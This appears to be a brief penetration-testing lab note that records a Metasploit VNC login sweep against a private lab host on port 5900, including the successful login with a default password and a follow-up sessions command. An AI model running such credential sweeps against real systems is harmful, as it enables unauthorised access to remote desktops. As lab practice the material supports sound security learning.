# Web Server Exploitations

## VNC (Port 5900)
    msf auxiliary(scanner/vnc/vnc_login) > run
    [*] 192.168.56.106:5900   - 192.168.56.106:5900 - Starting VNC login sweep
    [!] 192.168.56.106:5900   - No active DB -- Credential data will not be saved!
    [+] 192.168.56.106:5900   - 192.168.56.106:5900 - Login Successful: :password
    [*] 192.168.56.106:5900   - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf auxiliary(scanner/vnc/vnc_login) > sessions